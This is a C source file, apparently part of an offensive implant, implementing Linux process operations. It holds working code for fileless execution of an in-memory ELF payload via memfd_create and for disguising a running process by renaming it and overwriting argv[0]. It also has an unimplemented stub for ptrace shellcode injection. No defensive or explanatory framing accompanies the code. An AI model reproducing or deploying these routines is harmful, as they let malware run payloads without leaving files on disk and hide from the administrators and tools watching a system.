/**
 * Linux process operations: memfd_create, ptrace inject, masquerade
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <errno.h>
#include "../../include/process.h"

extern char **environ;

char *g_original_argv0 = NULL;
int g_original_argv0_len = 0;

void save_original_argv(int argc, char **argv) {
    if (!argv || !argv[0]) return;
    g_original_argv0 = argv[0];
    if (argc > 1)
        g_original_argv0_len = (int)(argv[1] - argv[0]);
    else
        g_original_argv0_len = (int)strlen(argv[0]) + 1;
}

int memfd_exec(const unsigned char *elf_data, size_t elf_size, char *const argv[]) {
    int fd = (int)syscall(SYS_memfd_create, "", MFD_CLOEXEC);
    if (fd < 0) return -1;

    if (write(fd, elf_data, elf_size) != (ssize_t)elf_size) {
        close(fd);
        return -1;
    }

    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);

    pid_t pid = fork();
    if (pid == 0) {
        execve(fd_path, argv, environ);
        _exit(1);
    }
    if (pid < 0) {
        close(fd);
        return -1;
    }
    close(fd);
    return (int)pid;
}

int ptrace_inject(pid_t target_pid, const unsigned char *shellcode, size_t sc_size) {
    (void)target_pid;
    (void)shellcode;
    (void)sc_size;
    /* ptrace injection is complex and platform-specific; not yet implemented */
    return -1;
}

void masquerade_process(const char *fake_name) {
    if (!fake_name) return;

    prctl(PR_SET_NAME, fake_name, 0, 0, 0);

    if (g_original_argv0 && g_original_argv0_len > 0) {
        int fake_len = (int)strlen(fake_name);
        int copy_len = (fake_len < g_original_argv0_len) ? fake_len : g_original_argv0_len - 1;
        memset(g_original_argv0, 0, (size_t)g_original_argv0_len);
        memcpy(g_original_argv0, fake_name, (size_t)copy_len);
    }
}
